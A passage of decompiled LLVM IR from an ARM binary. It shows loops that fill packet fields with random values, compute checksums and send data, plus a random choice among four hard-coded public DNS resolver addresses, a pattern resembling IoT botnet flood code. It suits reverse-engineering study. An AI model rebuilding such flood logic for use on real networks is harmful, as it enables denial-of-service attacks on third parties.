  %v7_ae90 = icmp eq i8 %v4_ae8c, 46
  store i1 %v7_ae90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ae90, label %bb146, label %.thread31

.thread31:                                        ; preds = %dec_label_pc_ae88
  %v2_ae9834 = add i32 %v1_ae9833, %v0_ae9832
  store i32 %v2_ae9834, i32* %r0.global-to-local, align 4
  br label %.thread35

bb146:                                            ; preds = %dec_label_pc_ae88
  %v3_ae94 = load i32, i32* %r2.global-to-local, align 4
  %v4_ae94 = inttoptr i32 %v3_ae94 to i8*
  store i8 %v1_ae94.off0, i8* %v4_ae94, align 1
  %v0_ae9c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_ae98 = load i32, i32* %r4.global-to-local, align 4
  %v1_ae98 = load i32, i32* %r1.global-to-local, align 4
  %v2_ae98 = add i32 %v1_ae98, %v0_ae98
  store i32 %v2_ae98, i32* %r0.global-to-local, align 4
  br i1 %v0_ae9c.pr, label %bb147, label %bb146..thread35_crit_edge

bb146..thread35_crit_edge:                        ; preds = %bb146
  %v0_aea485.pre = load i32, i32* %lr.global-to-local, align 4
  br label %.thread35

bb147:                                            ; preds = %bb146
  %v2_ae9c = add i32 %v2_ae98, 1
  store i32 %v2_ae9c, i32* %r2.global-to-local, align 4
  store i32 %v2_abf4, i32* %r0.global-to-local, align 4
  %v0_aea4 = load i32, i32* %lr.global-to-local, align 4
  %v1_aea4 = add i32 %v0_aea4, 1
  store i32 %v1_aea4, i32* %ip.global-to-local, align 4
  %v1_aea8 = add i32 %v1_ae98, 1
  store i32 %v1_aea8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %bb148

.thread35:                                        ; preds = %bb146..thread35_crit_edge, %.thread31
  %v0_aea485 = phi i32 [ %v0_aea485.pre, %bb146..thread35_crit_edge ], [ %v0_aea485151, %.thread31 ]
  %v0_aea8.ph = phi i32 [ %v1_ae98, %bb146..thread35_crit_edge ], [ %v1_ae9833, %.thread31 ]
  %v0_ae983254.ph = phi i32 [ %v0_ae98, %bb146..thread35_crit_edge ], [ %v0_ae9832, %.thread31 ]
  store i32 %v2_abf4, i32* %r0.global-to-local, align 4
  %v1_aea486 = add i32 %v0_aea485, 1
  store i32 %v1_aea486, i32* %ip.global-to-local, align 4
  %v1_aea887 = add i32 %v0_aea8.ph, 1
  store i32 %v1_aea887, i32* %r1.global-to-local, align 4
  %v2_aeb0 = urem i32 %v1_aea486, 256
  store i32 %v2_aeb0, i32* %lr.global-to-local, align 4
  %extract.t81 = trunc i32 %v1_aea486 to i8
  br label %bb148

bb148:                                            ; preds = %bb147, %.thread35
  %v0_aea485152 = phi i32 [ 0, %bb147 ], [ %v2_aeb0, %.thread35 ]
  %v1_aea891 = phi i32 [ %v1_aea8, %bb147 ], [ %v1_aea887, %.thread35 ]
  %v0_ae98325488 = phi i32 [ %v0_ae98, %bb147 ], [ %v0_ae983254.ph, %.thread35 ]
  %v1_ae9456.off0 = phi i8 [ 0, %bb147 ], [ %extract.t81, %.thread35 ]
  %v9_aeb4 = icmp eq i32 %v2_abf4, %v1_aea891
  store i1 %v9_aeb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aeb4, label %dec_label_pc_aebc.loopexit, label %dec_label_pc_ae88

dec_label_pc_aebc.loopexit:                       ; preds = %bb148
  %v2_aebc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aebc:                                ; preds = %dec_label_pc_aebc.loopexit, %bb145
  %v2_aebc = phi i32 [ %v2_aebc.pre, %dec_label_pc_aebc.loopexit ], [ %v0_ae80, %bb145 ]
  %v0_aebc.off0 = phi i8 [ %v1_ae9456.off0, %dec_label_pc_aebc.loopexit ], [ %extract.t78, %bb145 ]
  %v3_aebc = inttoptr i32 %v2_aebc to i8*
  store i8 %v0_aebc.off0, i8* %v3_aebc, align 1
  %v3_aec0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_abf4, i32* %r1.global-to-local, align 4
  %v0_aec8 = load i32, i32* %r4.global-to-local, align 4
  %v2_aec8 = add i32 %v0_aec8, %v2_abf4
  store i32 %v2_aec8, i32* %r3.global-to-local, align 4
  %v1_aecc = add i32 %v3_aec0, 1
  store i32 %v1_aecc, i32* @r4, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1, i32* @lr, align 4
  %v9_aedc = icmp eq i32 %v1_a994, %v1_aecc
  store i1 %v9_aedc, i1* %cpsr_z.global-to-local, align 1
  %v1_aee0 = add i32 %v2_aec8, 2
  store i32 %v1_aee0, i32* %r2.global-to-local, align 4
  %v4_aee4 = inttoptr i32 %v1_aee0 to i8*
  store i8 0, i8* %v4_aee4, align 1
  %v0_aee8 = load i32, i32* @lr, align 4
  %v1_aee8 = trunc i32 %v0_aee8 to i8
  %v2_aee8 = load i32, i32* %r2.global-to-local, align 4
  %v3_aee8 = add i32 %v2_aee8, 3
  %v4_aee8 = inttoptr i32 %v3_aee8 to i8*
  store i8 %v1_aee8, i8* %v4_aee8, align 1
  %v0_aeec = load i32, i32* @lr, align 4
  %v1_aeec = trunc i32 %v0_aeec to i8
  %v2_aeec = load i32, i32* %r2.global-to-local, align 4
  %v3_aeec = add i32 %v2_aeec, 1
  %v4_aeec = inttoptr i32 %v3_aeec to i8*
  store i8 %v1_aeec, i8* %v4_aeec, align 1
  %v0_aef0 = load i32, i32* %ip.global-to-local, align 4
  %v1_aef0 = trunc i32 %v0_aef0 to i8
  %v2_aef0 = load i32, i32* %r2.global-to-local, align 4
  %v3_aef0 = add i32 %v2_aef0, 2
  %v4_aef0 = inttoptr i32 %v3_aef0 to i8*
  store i8 %v1_aef0, i8* %v4_aef0, align 1
  %v0_aef4 = load i32, i32* @r4, align 4
  store i32 %v0_aef4, i32* %stack_var_-40, align 4
  %v8_aef8 = icmp sgt i32 %v1_a994, %v1_aecc
  br i1 %v8_aef8, label %dec_label_pc_ad54, label %dec_label_pc_aefc

dec_label_pc_aefc:                                ; preds = %dec_label_pc_aebc, %dec_label_pc_b0c8
  %v4_af6c.pre-phi = phi i32 [ %v4_b0cc, %dec_label_pc_b0c8 ], [ %v4_aca0, %dec_label_pc_aebc ]
  store i32 %v1_a994, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_ac78, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_af08

dec_label_pc_af08:                                ; preds = %dec_label_pc_af08, %dec_label_pc_b02c, %dec_label_pc_aefc
  br i1 %v2_ac78, label %dec_label_pc_af08, label %dec_label_pc_af0c

dec_label_pc_af0c:                                ; preds = %dec_label_pc_af08
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r6, align 4
  %v0_af1c = load i32, i32* @fp, align 4
  %v1_af1c = add i32 %v0_af1c, 27
  store i32 %v1_af1c, i32* @sb, align 4
  %v1_af20 = add i32 %v0_af1c, 47
  store i32 %v1_af20, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_af28

dec_label_pc_af28:                                ; preds = %dec_label_pc_af68.dec_label_pc_af28_crit_edge, %dec_label_pc_af0c
  %v1_af48 = phi i32 [ %v1_af34.pre, %dec_label_pc_af68.dec_label_pc_af28_crit_edge ], [ 65535, %dec_label_pc_af0c ]
  %v1_af30 = phi i32 [ %v1_b018, %dec_label_pc_af68.dec_label_pc_af28_crit_edge ], [ 0, %dec_label_pc_af0c ]
  store i32 %v2_a9ac, i32* %r3.global-to-local, align 4
  store i32 %v3_ac68, i32* %r8.global-to-local, align 4
  %v4_af30 = mul i32 %v1_af30, 4
  %v5_af30 = add i32 %v4_af30, %v2_a9ac
  %v6_af30 = inttoptr i32 %v5_af30 to i32*
  %v7_af30 = load i32, i32* %v6_af30, align 4
  store i32 %v7_af30, i32* @r4, align 4
  %v9_af34 = icmp eq i32 %v3_ac68, %v1_af48
  store i1 %v9_af34, i1* %cpsr_z.global-to-local, align 1
  %v1_af38 = add i32 %v7_af30, 20
  store i32 %v1_af38, i32* @r5, align 4
  %v1_af3c = add i32 %v7_af30, 28
  store i32 %v1_af3c, i32* @r8, align 4
  br i1 %v9_af34, label %dec_label_pc_b03c, label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_af28
  store i32 %v3_ac6c, i32* %ip.global-to-local, align 4
  %v9_af48 = icmp eq i32 %v3_ac6c, %v1_af48
  store i1 %v9_af48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af48, label %dec_label_pc_b058, label %dec_label_pc_af50

dec_label_pc_af50:                                ; preds = %dec_label_pc_b03c.dec_label_pc_af50_crit_edge, %dec_label_pc_af44
  %v1_af54 = phi i32 [ %v1_af54.pre, %dec_label_pc_b03c.dec_label_pc_af50_crit_edge ], [ %v1_af48, %dec_label_pc_af44 ]
  store i32 %v3_ac70, i32* %lr.global-to-local, align 4
  %v9_af54 = icmp eq i32 %v3_ac70, %v1_af54
  store i1 %v9_af54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af54, label %dec_label_pc_b074, label %dec_label_pc_af5c

dec_label_pc_af5c:                                ; preds = %dec_label_pc_b058.dec_label_pc_af5c_crit_edge, %dec_label_pc_af50
  %v1_af60 = phi i32 [ %v1_af60.pre, %dec_label_pc_b058.dec_label_pc_af5c_crit_edge ], [ %v1_af54, %dec_label_pc_af50 ]
  store i32 %v3_ac74, i32* %r0.global-to-local, align 4
  %v9_af60 = icmp eq i32 %v3_ac74, %v1_af60
  store i1 %v9_af60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af60, label %dec_label_pc_b090, label %dec_label_pc_af68

dec_label_pc_af68:                                ; preds = %dec_label_pc_b074, %dec_label_pc_af5c, %dec_label_pc_b090
  %v0_af68 = load i32, i32* @r4, align 4
  %v1_af68 = add i32 %v0_af68, 41
  store i32 %v1_af68, i32* %r0.global-to-local, align 4
  store i32 %v4_af6c.pre-phi, i32* %r1.global-to-local, align 4
  %v2_af70 = call i32 @function_ea2c(i32 %v1_af68, i32 %v4_af6c.pre-phi)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_af78 = load i32, i32* @r7, align 4
  %v1_af78 = trunc i32 %v0_af78 to i8
  %v2_af78 = load i32, i32* @r4, align 4
  %v3_af78 = add i32 %v2_af78, 10
  %v4_af78 = inttoptr i32 %v3_af78 to i8*
  store i8 %v1_af78, i8* %v4_af78, align 1
  %v0_af7c = load i32, i32* @r7, align 4
  %v1_af7c = trunc i32 %v0_af7c to i8
  %v2_af7c = load i32, i32* @r4, align 4
  %v3_af7c = add i32 %v2_af7c, 11
  %v4_af7c = inttoptr i32 %v3_af7c to i8*
  store i8 %v1_af7c, i8* %v4_af7c, align 1
  %v0_af80 = load i32, i32* @r4, align 4
  store i32 %v0_af80, i32* @r0, align 4
  %v2_af84 = call i32 @function_d0b8(i32 %v0_af80, i32 20)
  %v3_af84 = trunc i32 %v2_af84 to i8
  store i32 %v2_af84, i32* %r0.global-to-local, align 4
  %v4_af88 = sdiv i32 %v2_af84, 256
  store i32 %v4_af88, i32* %r3.global-to-local, align 4
  %v1_af8c = trunc i32 %v4_af88 to i8
  %v2_af8c = load i32, i32* @r4, align 4
  %v3_af8c = add i32 %v2_af8c, 11
  %v4_af8c = inttoptr i32 %v3_af8c to i8*
  store i8 %v1_af8c, i8* %v4_af8c, align 1
  %v3_af90 = load i32, i32* @r4, align 4
  %v4_af90 = add i32 %v3_af90, 10
  %v5_af90 = inttoptr i32 %v4_af90 to i8*
  store i8 %v3_af84, i8* %v5_af90, align 1
  %v0_af94 = load i32, i32* @r7, align 4
  %v1_af94 = trunc i32 %v0_af94 to i8
  %v2_af94 = load i32, i32* @r5, align 4
  %v3_af94 = add i32 %v2_af94, 6
  %v4_af94 = inttoptr i32 %v3_af94 to i8*
  store i8 %v1_af94, i8* %v4_af94, align 1
  %v0_af98 = load i32, i32* @r7, align 4
  %v1_af98 = trunc i32 %v0_af98 to i8
  %v2_af98 = load i32, i32* @r5, align 4
  %v3_af98 = add i32 %v2_af98, 7
  %v4_af98 = inttoptr i32 %v3_af98 to i8*
  store i8 %v1_af98, i8* %v4_af98, align 1
  %v0_af9c = load i32, i32* @r4, align 4
  %v1_af9c = add i32 %v0_af9c, 24
  %v2_af9c = inttoptr i32 %v1_af9c to i8*
  %v3_af9c = load i8, i8* %v2_af9c, align 1
  %v4_af9c = zext i8 %v3_af9c to i32
  store i32 %v4_af9c, i32* %r3.global-to-local, align 4
  %v1_afa0 = add i32 %v0_af9c, 25
  %v2_afa0 = inttoptr i32 %v1_afa0 to i8*
  %v3_afa0 = load i8, i8* %v2_afa0, align 1
  %v4_afa0 = zext i8 %v3_afa0 to i32
  %v0_afa4 = load i32, i32* @r5, align 4
  store i32 %v0_afa4, i32* @r1, align 4
  %v4_afa8 = mul nuw nsw i32 %v4_afa0, 256
  %v5_afa8 = or i32 %v4_afa8, %v4_af9c
  store i32 %v5_afa8, i32* %r2.global-to-local, align 4
  store i32 %v0_af9c, i32* %r0.global-to-local, align 4
  %v0_afb0 = load i32, i32* @sb, align 4
  store i32 %v0_afb0, i32* %r3.global-to-local, align 4
  %v4_afb4 = call i32 @function_d114(i32 %v0_af9c, i32 %v0_afa4, i32 %v5_afa8, i32 %v0_afb0)
  %v5_afb4 = trunc i32 %v4_afb4 to i8
  store i32 %v4_afb4, i32* %r0.global-to-local, align 4
  %v3_afb8 = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-2176.0, i32* %r2.global-to-local, align 4
  %v5_afc8 = mul i32 %v3_afb8, 24
  %v2_afcc = add i32 %v5_afc8, %arg2
  store i32 %v2_afcc, i32* %lr.global-to-local, align 4
  %v4_afd0 = sdiv i32 %v4_afb4, 256
  store i32 %v4_afd0, i32* %r3.global-to-local, align 4
  %v3_afd4 = load i32, i32* @r5, align 4
  %v4_afd4 = add i32 %v3_afd4, 6
  %v5_afd4 = inttoptr i32 %v4_afd4 to i8*
  store i8 %v5_afb4, i8* %v5_afd4, align 1
  %v0_afd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_afd8 = trunc i32 %v0_afd8 to i8
  %v2_afd8 = load i32, i32* @r5, align 4
  %v3_afd8 = add i32 %v2_afd8, 7
  %v4_afd8 = inttoptr i32 %v3_afd8 to i8*
  store i8 %v1_afd8, i8* %v4_afd8, align 1
  %v0_afdc = load i32, i32* %r2.global-to-local, align 4
  %v1_afdc = load i32, i32* %lr.global-to-local, align 4
  %v2_afdc = add i32 %v1_afdc, 4
  %v3_afdc = inttoptr i32 %v2_afdc to i32*
  store i32 %v0_afdc, i32* %v3_afdc, align 4
  %v0_afe0 = load i32, i32* @r4, align 4
  %v1_afe0 = add i32 %v0_afe0, 20
  %v2_afe0 = inttoptr i32 %v1_afe0 to i32*
  %v3_afe0 = load i32, i32* %v2_afe0, align 4
  %v3_afe4 = udiv i32 %v3_afe0, 65536
  store i32 %v3_afe4, i32* %r3.global-to-local, align 4
  %v3_afe812 = udiv i32 %v3_afe0, 16777216
  %v1_afec = trunc i32 %v3_afe812 to i8
  %v2_afec = load i32, i32* %lr.global-to-local, align 4
  %v3_afec = add i32 %v2_afec, 3
  %v4_afec = inttoptr i32 %v3_afec to i8*
  store i8 %v1_afec, i8* %v4_afec, align 1
  %v0_aff0 = load i32, i32* %r3.global-to-local, align 4
  %v1_aff0 = trunc i32 %v0_aff0 to i8
  %v2_aff0 = load i32, i32* %lr.global-to-local, align 4
  %v3_aff0 = add i32 %v2_aff0, 2
  %v4_aff0 = inttoptr i32 %v3_aff0 to i8*
  store i8 %v1_aff0, i8* %v4_aff0, align 1
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_affc = load i32, i32* @r4, align 4
  store i32 %v0_affc, i32* %r1.global-to-local, align 4
  store i32 %v3_ac08, i32* %r0.global-to-local, align 4
  %v0_b004 = load i32, i32* @sl, align 4
  store i32 %v0_b004, i32* %r2.global-to-local, align 4
  %v0_b008 = load i32, i32* %lr.global-to-local, align 4
  %v6_b010 = inttoptr i32 %v0_affc to i32*
  %v7_b010 = call i32 @function_1237c(i32 %v3_ac08, i32* %v6_b010, i32 %v0_b004, i32 16384, i32 %v0_b008, i32 16)
  %v3_b014 = load i32, i32* %stack_var_-40, align 4
  %v1_b018 = add i32 %v3_b014, 1
  store i32 %v1_b018, i32* %r0.global-to-local, align 4
  store i32 %v1_a994, i32* %r3.global-to-local, align 4
  %v9_b020 = icmp eq i32 %v1_a994, %v1_b018
  store i1 %v9_b020, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b018, i32* %stack_var_-40, align 4
  %v8_b028 = icmp sgt i32 %v1_a994, %v1_b018
  br i1 %v8_b028, label %dec_label_pc_af68.dec_label_pc_af28_crit_edge, label %dec_label_pc_b02c

dec_label_pc_af68.dec_label_pc_af28_crit_edge:    ; preds = %dec_label_pc_af68
  %v1_af34.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_af28

dec_label_pc_b02c:                                ; preds = %dec_label_pc_af68
  store i32 %v1_a994, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_af08

dec_label_pc_b03c:                                ; preds = %dec_label_pc_af28
  %v0_b03c = call i32 @function_e978()
  %v1_b03c = trunc i32 %v0_b03c to i8
  store i32 %v0_b03c, i32* %r0.global-to-local, align 4
  store i32 %v3_ac6c, i32* %ip.global-to-local, align 4
  %v4_b044 = sdiv i32 %v0_b03c, 256
  store i32 %v4_b044, i32* %r3.global-to-local, align 4
  %v1_b048 = load i32, i32* @r6, align 4
  %v9_b048 = icmp eq i32 %v3_ac6c, %v1_b048
  store i1 %v9_b048, i1* %cpsr_z.global-to-local, align 1
  %v1_b04c = trunc i32 %v4_b044 to i8
  %v2_b04c = load i32, i32* @r4, align 4
  %v3_b04c = add i32 %v2_b04c, 5
  %v4_b04c = inttoptr i32 %v3_b04c to i8*
  store i8 %v1_b04c, i8* %v4_b04c, align 1
  %v3_b050 = load i32, i32* @r4, align 4
  %v4_b050 = add i32 %v3_b050, 4
  %v5_b050 = inttoptr i32 %v4_b050 to i8*
  store i8 %v1_b03c, i8* %v5_b050, align 1
  %v0_b054 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b054, label %dec_label_pc_b058, label %dec_label_pc_b03c.dec_label_pc_af50_crit_edge

dec_label_pc_b03c.dec_label_pc_af50_crit_edge:    ; preds = %dec_label_pc_b03c
  %v1_af54.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_af50

dec_label_pc_b058:                                ; preds = %dec_label_pc_b03c, %dec_label_pc_af44
  %v0_b058 = call i32 @function_e978()
  %v1_b058 = trunc i32 %v0_b058 to i8
  store i32 %v0_b058, i32* %r0.global-to-local, align 4
  store i32 %v3_ac70, i32* %lr.global-to-local, align 4
  %v4_b060 = sdiv i32 %v0_b058, 256
  store i32 %v4_b060, i32* %r3.global-to-local, align 4
  %v1_b064 = load i32, i32* @r6, align 4
  %v9_b064 = icmp eq i32 %v3_ac70, %v1_b064
  store i1 %v9_b064, i1* %cpsr_z.global-to-local, align 1
  %v3_b068 = load i32, i32* @r4, align 4
  %v4_b068 = add i32 %v3_b068, 20
  %v5_b068 = inttoptr i32 %v4_b068 to i8*
  store i8 %v1_b058, i8* %v5_b068, align 1
  %v0_b06c = load i32, i32* %r3.global-to-local, align 4
  %v1_b06c = trunc i32 %v0_b06c to i8
  %v2_b06c = load i32, i32* @r5, align 4
  %v3_b06c = add i32 %v2_b06c, 1
  %v4_b06c = inttoptr i32 %v3_b06c to i8*
  store i8 %v1_b06c, i8* %v4_b06c, align 1
  %v0_b070 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b070, label %dec_label_pc_b074, label %dec_label_pc_b058.dec_label_pc_af5c_crit_edge

dec_label_pc_b058.dec_label_pc_af5c_crit_edge:    ; preds = %dec_label_pc_b058
  %v1_af60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_af5c

dec_label_pc_b074:                                ; preds = %dec_label_pc_b058, %dec_label_pc_af50
  %v0_b074 = call i32 @function_e978()
  %v1_b074 = trunc i32 %v0_b074 to i8
  %v4_b078 = sdiv i32 %v0_b074, 256
  store i32 %v4_b078, i32* %r3.global-to-local, align 4
  %v3_b07c = load i32, i32* @r5, align 4
  %v4_b07c = add i32 %v3_b07c, 2
  %v5_b07c = inttoptr i32 %v4_b07c to i8*
  store i8 %v1_b074, i8* %v5_b07c, align 1
  store i32 %v3_ac74, i32* %r0.global-to-local, align 4
  %v1_b084 = load i32, i32* @r6, align 4
  %v9_b084 = icmp eq i32 %v3_ac74, %v1_b084
  store i1 %v9_b084, i1* %cpsr_z.global-to-local, align 1
  %v0_b088 = load i32, i32* %r3.global-to-local, align 4
  %v1_b088 = trunc i32 %v0_b088 to i8
  %v2_b088 = load i32, i32* @r5, align 4
  %v3_b088 = add i32 %v2_b088, 3
  %v4_b088 = inttoptr i32 %v3_b088 to i8*
  store i8 %v1_b088, i8* %v4_b088, align 1
  %v0_b08c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b08c, label %dec_label_pc_b090, label %dec_label_pc_af68

dec_label_pc_b090:                                ; preds = %dec_label_pc_b074, %dec_label_pc_af5c
  %v0_b090 = call i32 @function_e978()
  %v1_b090 = trunc i32 %v0_b090 to i8
  store i32 %v0_b090, i32* %r0.global-to-local, align 4
  %v4_b094 = sdiv i32 %v0_b090, 256
  store i32 %v4_b094, i32* %r3.global-to-local, align 4
  %v3_b098 = load i32, i32* @r4, align 4
  %v4_b098 = add i32 %v3_b098, 28
  %v5_b098 = inttoptr i32 %v4_b098 to i8*
  store i8 %v1_b090, i8* %v5_b098, align 1
  %v0_b09c = load i32, i32* %r3.global-to-local, align 4
  %v1_b09c = trunc i32 %v0_b09c to i8
  %v2_b09c = load i32, i32* @r8, align 4
  %v3_b09c = add i32 %v2_b09c, 1
  %v4_b09c = inttoptr i32 %v3_b09c to i8*
  store i8 %v1_b09c, i8* %v4_b09c, align 1
  br label %dec_label_pc_af68

dec_label_pc_b0a4:                                ; preds = %dec_label_pc_ab70, %dec_label_pc_ab3c, %dec_label_pc_aae0, %dec_label_pc_a988
  %v0_b0a4 = call i32 @function_e978()
  %v1_b0a8 = urem i32 %v0_b0a4, 4
  store i32 %v1_b0a8, i32* %r0.global-to-local, align 4
  %v2_b0ac = icmp eq i32 %v1_b0a8, 3
  store i1 %v2_b0ac, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_b0a4 to i2
  switch i2 %trunc, label %dec_label_pc_abe420 [
    i2 0, label %dec_label_pc_b0ec
    i2 1, label %dec_label_pc_b100
    i2 -2, label %dec_label_pc_b10c
    i2 -1, label %dec_label_pc_b11c
  ]

dec_label_pc_b0c8:                                ; preds = %dec_label_pc_ac44
  store i32 %v2_abf4, i32* %r0.global-to-local, align 4
  %v4_b0cc = sext i8 %v5_ac60 to i32
  store i32 %v4_b0cc, i32* %r1.global-to-local, align 4
  %v2_b0d0 = add i32 %v4_b0cc, %v2_abf4
  store i32 %v2_b0d0, i32* @fp, align 4
  br label %dec_label_pc_aefc

dec_label_pc_b0d8:                                ; preds = %dec_label_pc_ac18
  store i32 %v3_ac08, i32* %r0.global-to-local, align 4
  %v1_b0dc = call i32 @function_11af0(i32 %v3_ac08)
  store i32 %v1_b0dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b0e0

dec_label_pc_b0e0:                                ; preds = %dec_label_pc_abf0, %dec_label_pc_abe4, %dec_label_pc_b0d8
  %v29_b0e8 = phi i32 [ %v3_ac08, %dec_label_pc_abf0 ], [ %v29_b0e874, %dec_label_pc_abe4 ], [ %v1_b0dc, %dec_label_pc_b0d8 ]
  store i32 %v3_a988, i32* %r4.global-to-local, align 4
  store i32 %v15_a988, i32* %r8.global-to-local, align 4
  store i32 %v18_a988, i32* %sb.global-to-local, align 4
  store i32 %v21_a988, i32* %sl.global-to-local, align 4
  store i32 %v24_a988, i32* %fp.global-to-local, align 4
  ret i32 %v29_b0e8

dec_label_pc_b0ec:                                ; preds = %dec_label_pc_b0a4
  store i32 134744072, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_abe4

dec_label_pc_b100:                                ; preds = %dec_label_pc_b0a4
  store i32 707416650, i32* @r4, align 4
  br label %dec_label_pc_abe4

dec_label_pc_b10c:                                ; preds = %dec_label_pc_b0a4
  store i32 104859200, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_abe4

dec_label_pc_b11c:                                ; preds = %dec_label_pc_b0a4
  store i32 33686020, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_abe4

; uselistorder directives
  uselistorder i32 %v4_b0cc, { 0, 2, 1 }
  uselistorder i32 %v1_b0a8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_b0a4, { 1, 0 }
  uselistorder i32 %v0_b090, { 0, 2, 1 }
  uselistorder i32 %v0_b058, { 0, 2, 1 }
  uselistorder i32 %v4_b044, { 1, 0 }
  uselistorder i32 %v0_b03c, { 0, 2, 1 }
  uselistorder i32 %v1_b018, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v4_afb4, { 0, 2, 1 }
  uselistorder i32 %v0_af9c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_af88, { 1, 0 }
  uselistorder i32 %v2_af84, { 0, 2, 1 }
  uselistorder i32 %v7_af30, { 1, 0, 2 }
  uselistorder i32 %v4_af6c.pre-phi, { 1, 0 }
  uselistorder i32 %v2_aeb0, { 1, 0 }
  uselistorder i32 %v1_aea486, { 1, 0, 2 }
  uselistorder i32 %v1_ae98, { 2, 1, 0 }
  uselistorder i32 %v0_ae98, { 1, 2, 0 }
  uselistorder i32 %v0_ae9832, { 1, 0 }
  uselistorder i32 %v1_ae9833, { 2, 0, 1 }
  uselistorder i8 %extract.t78, { 1, 0 }
  uselistorder i32 %v1_ae6c, { 2, 0, 4, 1, 3, 5, 6 }
  uselistorder i32 %v0_ade8, { 1, 0 }
  uselistorder i32 %v3_ad24, { 1, 0, 2 }
  uselistorder i32 %v1_acec, { 1, 0 }
  uselistorder i32 %v1_ace0, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_acb0, { 1, 0 }
  uselistorder i32 %v3_aca8, { 1, 0 }
  uselistorder i32 %v4_aca0, { 0, 4, 2, 5, 3, 1 }
  uselistorder i8 %v5_ac60, { 1, 0 }
  uselistorder i32 %v0_ac5c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ac50, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_ac3c, { 1, 0 }
  uselistorder i1 %v7_ac0c, { 1, 0 }
  uselistorder i32 %v3_ac08, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v2_abf4, { 0, 11, 1, 6, 4, 3, 7, 10, 9, 8, 5, 2 }
  uselistorder i32 %stack_var_-2176.0, { 1, 0 }
  uselistorder i32 %v1_abdc, { 1, 0, 2 }
  uselistorder i1 %v7_abac, { 1, 0 }
  uselistorder i32 %v1_aba8, { 1, 0, 2 }
  uselistorder i1 %v8_aba0, { 1, 0 }
  uselistorder i1 %v7_ab9c, { 1, 0 }
  uselistorder i32 %v1_ab90, { 1, 0 }
  uselistorder i8 %v2_ab84, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ab88, { 1, 0 }
  uselistorder i32 %v0_aba8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_ab74, { 0, 2, 1 }
  uselistorder i32 %v1_ab8c, { 0, 2, 1 }
  uselistorder i32 %v2_ab5c, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v2_ab54, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ab3c, { 1, 2, 0, 3, 4, 5 }
  uselistorder i1 %v7_ab34, { 1, 0 }
  uselistorder i32 %v0_ab34, { 2, 3, 1, 4, 6, 5, 0 }
  uselistorder i32 %v0_aad8, { 1, 0, 3, 2 }
  uselistorder i32 %v5_aaa8, { 0, 3, 5, 4, 2, 1, 7, 6 }
  uselistorder i32 %v1_aa2c, { 1, 0 }
  uselistorder i32 %v7_a9e8, { 0, 1, 2, 4, 3 }
  uselistorder i8 %v5_a9e4, { 1, 0 }
  uselistorder i32 %v6_a9c4, { 1, 0 }
  uselistorder i32 %v2_a9ac, { 0, 3, 1, 2 }
  uselistorder i32 %v1_a994, { 7, 4, 5, 6, 3, 8, 9, 10, 2, 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 0 }
